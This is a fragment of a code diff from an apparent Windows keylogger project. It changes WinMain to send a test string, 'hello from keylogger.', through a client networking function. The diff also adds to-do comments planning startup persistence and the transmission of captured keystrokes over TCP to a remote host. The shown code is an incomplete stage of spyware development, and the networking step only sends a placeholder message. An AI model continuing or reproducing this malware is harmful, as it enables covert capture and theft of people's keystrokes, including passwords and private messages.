@@ -39,7 +39,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 {
     //FreeConsole();
     // testing client networking function.
-    client();
+    const char *x = "hello from keylogger."; 
+    client(x);
     return 1;
     // end testing.
     Maps vkMaps;
@@ -88,5 +89,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     ~ maybe seggregate the code that resolves dns to ipv4 format into a separate header file. 
     ~ write code that sends and recieves keystroke data over the tcp connection.
     ~ ensure proper spacing between code statements to improve readability.
-    ~ check if HOST in ks2server.cpp is equal to a domain name or ipv4 address so that we can resolve accordingly.
+    ~ write code to schedule this program to be run on startup.
+    ~ we have implemented a send function, instead of sending a c style array, we must send keystrokes to the client IF there is a valid IP set.
 */
